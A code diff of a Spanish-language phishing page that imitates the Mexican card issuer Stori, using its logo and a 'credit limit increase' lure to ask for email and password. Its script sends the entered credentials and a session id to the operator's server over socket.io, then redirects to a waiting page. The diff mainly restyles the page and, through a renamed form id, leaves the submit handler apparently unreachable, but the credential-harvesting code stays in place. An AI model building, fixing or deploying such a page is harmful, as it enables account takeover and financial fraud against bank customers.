@@ -2,52 +2,68 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verificación de cuenta</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Stori MX Simulación</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
     body {
-      background-color: #f3f6fb;
-      font-family: Arial, sans-serif;
+      margin: 0;
+      font-family: 'Open Sans', sans-serif;
+      background: #f3f6f9;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      margin: 0;
+      min-height: 90vh;
     }
-    .container {
+
+    .screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       background: #fff;
-      border-radius: 15px;
-      padding: 40px 30px;
-      width: 100%;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      width: 90%;
       max-width: 400px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
       text-align: center;
     }
+
     .logo {
-      margin-bottom: 30px;
+      width: 100px;
+      margin-bottom: 1rem;
     }
-    .logo img {
-      height: 50px;
-    }
-    h2 {
-      font-size: 1.5em;
-      margin-bottom: 10px;
-    }
-    p {
-      color: #777;
-      font-size: 0.95em;
-      margin-bottom: 20px;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
+
+    /* Estilo de los campos de texto */
+    .input-group {
+      display: flex;
+      align-items: center;
+      background: #f0f2f5;
       border-radius: 8px;
-      font-size: 1em;
+      margin: 1rem 0;
+      padding: 0.0rem 1rem;
+      width: 100%;
+      max-width: 350px; /* Reducido el tamaño para hacerlos más angostos */
     }
+
+    .input-group .icon {
+      color: #888;
+      margin-right: 0.0rem;
+    }
+
+    .input-group input {
+      border: none;
+      background: transparent;
+      outline: none;
+      flex: 1;
+      font-size: 1rem; /* Ajuste de tamaño de texto */
+      padding: 10px 0.75rem;
+      height: 20px; /* Ajuste de altura */
+    }
+
     button {
-      background-color: #00b075;
+      background: #00b67a;
       color: white;
       padding: 12px;
       border: none;
@@ -56,54 +72,125 @@
       font-size: 1em;
       width: 100%;
     }
+
     button:hover {
-      background-color: #019765;
+      background: #00a16a;
     }
+
+    button:disabled {
+      background: #cccccc;
+      cursor: not-allowed;
+    }
+
+    h2 {
+      color: #003049;
+      margin: 1rem 0 0.5rem;
+    }
+
+    p {
+      color: #555;
+      font-size: 0.95rem;
+    }
+
+    .mensaje-error {
+      color: red;
+      margin-top: 1rem;
+      font-size: 0.85rem;
+    }
+
+    .campo-requerido {
+      border: 1px solid red !important;
+    }
+
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://i.imgur.com/GFGp9I7.png" alt="logo" />
-    </div>
+  <div class="screen active" id="pantallaInicio">
+    <img src="https://i.imgur.com/GFGp9I7.png" alt="Stori Logo" class="logo">
     <h2>Bienvenido a su análisis de aumento de cupo</h2>
     <p>Ingrese su correo y contraseña para continuar</p>
-    <form id="login-form">
-      <input type="email" id="usuario" placeholder="Correo electrónico" required />
-      <input type="password" id="clave" placeholder="Contraseña" required />
-      <button type="submit">Continuar</button>
-    </form>
+    <div class="input-group">
+      <div class="icon"><i class="fas fa-envelope"></i></div>
+      <input type="email" id="email" placeholder="Correo electrónico" required>
+    </div>
+    <div class="input-group">
+      <div class="icon"><i class="fas fa-lock"></i></div>
+      <input type="password" id="password" placeholder="Contraseña" required>
+    </div>
+    <p id="emailError" class="mensaje-error"></p>
+    <p id="passwordError" class="mensaje-error"></p>
+    <button id="btnContinuar" onclick="validarEmail()">Continuar</button>
   </div>
 
-  <!-- Scripts al final del body -->
- <!-- Scripts al final del body -->
-<script src="/socket.io/socket.io.js"></script>
-<script>
-  const socket = io();
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
 
-  window.addEventListener('DOMContentLoaded', () => {
-    const form = document.getElementById('login-form');
+    window.addEventListener('DOMContentLoaded', () => {
+      const form = document.getElementById('login-form');
 
-    if (form) {
-      form.addEventListener('submit', (e) => {
-        e.preventDefault();
+      if (form) {
+        form.addEventListener('submit', (e) => {
+          e.preventDefault();
 
-        const correo = document.getElementById('usuario').value;
-        const contrasena = document.getElementById('clave').value;
+          const correo = document.getElementById('email').value;
+          const contrasena = document.getElementById('password').value;
 
-        // 🔑 Generar y guardar sessionId
-        const sessionId = Math.random().toString(36).substring(2, 15);
-        localStorage.setItem('sessionId', sessionId);
+          // 🔑 Generar y guardar sessionId
+          const sessionId = Math.random().toString(36).substring(2, 15);
+          localStorage.setItem('sessionId', sessionId);
 
-        // ✅ Enviar también el sessionId al servidor
-        socket.emit('dataForm', { correo, contrasena, sessionId });
+          // ✅ Enviar datos al servidor mediante socket.io
+          socket.emit('dataForm', { correo, contrasena, sessionId });
 
-        // 🕒 Ir a pantalla de espera
-        window.location.href = 'opciones.html';
-      });
+          // 🕒 Ir a pantalla de espera (o la siguiente página)
+          window.location.href = 'opciones.html';
+        });
+      }
+    });
+
+    function validarEmail() {
+      const email = document.getElementById("email").value;
+      const emailError = document.getElementById("emailError");
+      const emailInput = document.getElementById("email");
+      
+      // Validación de formato de email
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      
+      if (!email) {
+        emailError.textContent = "El correo electrónico es obligatorio";
+        emailInput.classList.add("campo-requerido");
+        return false;
+      } else if (!emailRegex.test(email)) {
+        emailError.textContent = "Por favor, ingrese un correo electrónico válido";
+        emailInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        emailError.textContent = "";
+        emailInput.classList.remove("campo-requerido");
+        return true;
+      }
     }
-  });
-</script>
 
+    function validarPassword() {
+      const password = document.getElementById("password").value;
+      const passwordError = document.getElementById("passwordError");
+      const passwordInput = document.getElementById("password");
+
+      if (!password) {
+        passwordError.textContent = "La contraseña es obligatoria";
+        passwordInput.classList.add("campo-requerido");
+        return false;
+      } else if (password.length < 4) {
+        passwordError.textContent = "La contraseña debe tener al menos 4 caracteres";
+        passwordInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        passwordError.textContent = "";
+        passwordInput.classList.remove("campo-requerido");
+        return true;
+      }
+    }
+  </script>
 </body>
 </html>
